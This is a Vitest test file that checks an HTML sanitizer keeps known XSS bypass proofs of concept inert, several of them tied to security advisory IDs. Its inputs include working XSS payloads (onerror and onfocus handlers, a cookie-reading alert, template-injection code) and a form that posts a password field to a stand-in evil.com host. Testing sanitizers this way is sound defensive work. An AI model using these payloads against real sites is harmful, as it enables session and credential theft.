// @vitest-environment jsdom

import { describe, expect, it } from 'vitest';
import { sanitizeHTML } from './sanitize';

// Used only by tests that need a fresh module evaluation (e.g. the SSR
// contract test, which depends on `sanitize.ts`'s top-level
// `typeof window` capture). Each call re-evaluates `sanitize.ts` once
// and registers one additional `afterSanitizeAttributes` hook on the
// shared DOMPurify singleton — so use sparingly and prefer the
// top-level `sanitizeHTML` import where possible.
async function loadFreshSanitizeHTML(tag: string) {
  const module = await import(`./sanitize?cache-bust=${tag}-${Date.now()}`);
  return module.sanitizeHTML as typeof sanitizeHTML;
}

function parseFragment(html: string): DocumentFragment {
  const template = document.createElement('template');
  template.innerHTML = html;
  return template.content;
}

function expectInertHTML(html: string): void {
  const fragment = parseFragment(html);
  expect(fragment.querySelector('script, iframe, object, embed')).toBeNull();

  for (const element of Array.from(fragment.querySelectorAll('*'))) {
    expect(element.tagName.includes('-')).toBe(false);

    for (const attr of Array.from(element.attributes)) {
      const name = attr.name.toLowerCase();
      const value = attr.value.trim().toLowerCase();

      expect(name.startsWith('on')).toBe(false);
      expect(name).not.toBe('srcdoc');
      expect(value.startsWith('javascript:')).toBe(false);
      expect(value.startsWith('data:text/html')).toBe(false);
    }
  }
}

describe('sanitizeHTML', () => {
  it('keeps the mutation-XSS re-contextualization PoC inert [GHSA-h8r8-wccr-v5f2]', () => {
    const payload = ` <img src=x alt="</xmp><img src=x onerror=alert('expoc')>">`;

    const sanitized = sanitizeHTML(payload);
    const finalPass = sanitizeHTML(`<xmp>${sanitized}</xmp>`);

    expectInertHTML(sanitized);
    expectInertHTML(finalPass);
    expect(finalPass.toLowerCase()).not.toContain('onerror');
  });

  it('ignores prototype-polluted custom element handling [GHSA-v9jr-rg53-9pgp]', async () => {
    const originalTagNameCheck = Object.getOwnPropertyDescriptor(
      Object.prototype,
      'tagNameCheck'
    );
    const originalAttributeNameCheck = Object.getOwnPropertyDescriptor(
      Object.prototype,
      'attributeNameCheck'
    );

    Object.defineProperty(Object.prototype, 'tagNameCheck', {
      value: /.*/,
      configurable: true,
      writable: true
    });
    Object.defineProperty(Object.prototype, 'attributeNameCheck', {
      value: /.*/,
      configurable: true,
      writable: true
    });

    try {
      // Prototype pollution affects per-call lookups inside dompurify
      // (CUSTOM_ELEMENT_HANDLING resolves config keys at sanitize time,
      // not module-init time), so the top-level `sanitizeHTML` import
      // is sufficient — no need to re-evaluate the module.
      const sanitized = sanitizeHTML(
        '<x-x onfocus=alert(document.cookie) tabindex=0 autofocus>'
      );

      expectInertHTML(sanitized);
      expect(sanitized).not.toContain('<x-x');
      expect(sanitized.toLowerCase()).not.toContain('onfocus');
    } finally {
      if (originalTagNameCheck) {
        Object.defineProperty(Object.prototype, 'tagNameCheck', originalTagNameCheck);
      } else {
        Reflect.deleteProperty(Object.prototype, 'tagNameCheck');
      }
      if (originalAttributeNameCheck) {
        Object.defineProperty(Object.prototype, 'attributeNameCheck', originalAttributeNameCheck);
      } else {
        Reflect.deleteProperty(Object.prototype, 'attributeNameCheck');
      }
    }
  });

  it('keeps function ADD_TAGS / FORBID_TAGS bypass payloads inert [GHSA-h7mw-gpvr-xq4m]', () => {
    const iframePayload = '<iframe src="https://evil.com"></iframe>';
    const formPayload = '<form action="https://evil.com/steal"><input name=password></form>';

    const sanitized = `${sanitizeHTML(iframePayload)}${sanitizeHTML(formPayload)}`;

    expectInertHTML(sanitized);
    expect(sanitized).not.toContain('<iframe');
  });

  it('keeps SAFE_FOR_TEMPLATES / RETURN_DOM split-node PoC inert as plain HTML [GHSA-crv5-9vww-q3g8]', () => {
    const payload =
      '<div id="app">{<foo></foo>{constructor.constructor("alert(1)")()}<foo></foo>}</div>';

    const sanitized = sanitizeHTML(payload);

    expectInertHTML(sanitized);
    expect(sanitized).not.toContain('<foo');
    expect(parseFragment(sanitized).querySelector('#app')?.textContent).toContain(
      'constructor.constructor'
    );
  });

  it('adds rel to target blank links only', () => {
    const sanitized = sanitizeHTML(
      '<a href="https://example.com" target="_blank">blank</a><a href="/recipes" target="_self">self</a>'
    );
    const links = Array.from(parseFragment(sanitized).querySelectorAll('a'));

    expect(links[0]?.getAttribute('rel')).toBe('noopener noreferrer nofollow ugc');
    expect(links[1]?.hasAttribute('rel')).toBe(false);
  });

  it('neuters profile-field-style attribute breakout payloads', () => {
    const displayName = '" onerror=alert(1) data-owned="';
    const sanitized = sanitizeHTML(`<img alt="${displayName}" src="/avatar.png">`);

    expectInertHTML(sanitized);
    expect(sanitized.toLowerCase()).not.toContain('onerror');
  });

  it('keeps translation-style sanitize then mangle then sanitize output inert', () => {
    const translated = sanitizeHTML('<p>hello <img src=x onerror=alert(1)></p>');
    const mangled = translated.replace('hello', 'hola <svg><script>alert(1)</script></svg>');
    const finalPass = sanitizeHTML(mangled);

    expectInertHTML(finalPass);
    expect(finalPass.toLowerCase()).not.toContain('script');
    expect(finalPass.toLowerCase()).not.toContain('onerror');
  });

  it('returns an empty string during SSR instead of raw HTML', async () => {
    const originalWindowDescriptor = Object.getOwnPropertyDescriptor(globalThis, 'window');

    Object.defineProperty(globalThis, 'window', {
      value: undefined,
      configurable: true,
      writable: true
    });

    try {
      // Re-evaluate the module so its top-level `isBrowser` capture
      // sees `window` as undefined.
      const ssrSanitizeHTML = await loadFreshSanitizeHTML('ssr');
      expect(ssrSanitizeHTML('<p>server</p><img src=x onerror=alert(1)>')).toBe('');
    } finally {
      if (originalWindowDescriptor) {
        Object.defineProperty(globalThis, 'window', originalWindowDescriptor);
      } else {
        Reflect.deleteProperty(globalThis, 'window');
      }
    }
  });
});
